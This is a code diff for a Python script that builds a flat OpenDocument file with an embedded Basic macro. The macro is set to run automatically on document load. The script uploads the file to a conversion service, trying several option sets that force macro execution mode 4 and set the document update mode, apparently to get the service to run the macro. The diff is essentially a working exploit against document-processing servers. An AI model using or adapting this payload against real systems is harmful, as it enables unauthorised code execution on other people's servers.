@@ -82,12 +82,23 @@ def macro_odt():
     return out.getvalue()
 
 
-def send(data, fields, label):
+def flat_macro():
+    source = BASIC.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+    return f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ooo="http://openoffice.org/2004/office" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
+<office:scripts><office:script script:language="ooo:Basic"><ooo:libraries><ooo:library-embedded ooo:name="Standard"><ooo:module ooo:name="Module1"><ooo:source-code>{source}</ooo:source-code></ooo:module></ooo:library-embedded></ooo:libraries></office:script>
+<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts>
+<office:body><office:text><text:p>ORIGINAL_DOCUMENT</text:p></office:text></office:body></office:document>'''.encode()
+
+
+def send(data, fields, label, filename="macro.fodt"):
+    if isinstance(data, str):
+        data = data.encode()
     boundary = "----Arena" + uuid.uuid4().hex
     chunks = []
     for name, value in fields.items():
         chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
-    chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"macro.odt\"\r\nContent-Type: application/vnd.oasis.opendocument.text\r\n\r\n".encode())
+    chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode())
     chunks.append(data)
     chunks.append(f"\r\n--{boundary}--\r\n".encode())
     body = b"".join(chunks)
@@ -109,8 +120,8 @@ def descriptor(name, typ, value):
 
 
 def main():
-    doc = macro_odt()
-    print("MACRO_ODT_BYTES", len(doc), flush=True)
+    doc = flat_macro()
+    print("FLAT_MACRO_BYTES", len(doc), flush=True)
     send(doc, {}, "NO_OPTIONS")
     send(doc, {"infilterOptions": descriptor("MacroExecutionMode", "short", "4")}, "MACRO_SHORT_4")
     both = json.dumps({"MacroExecutionMode": {"type": "short", "value": "4"}, "UpdateDocMode": {"type": "short", "value": "3"}}, separators=(",", ":"))
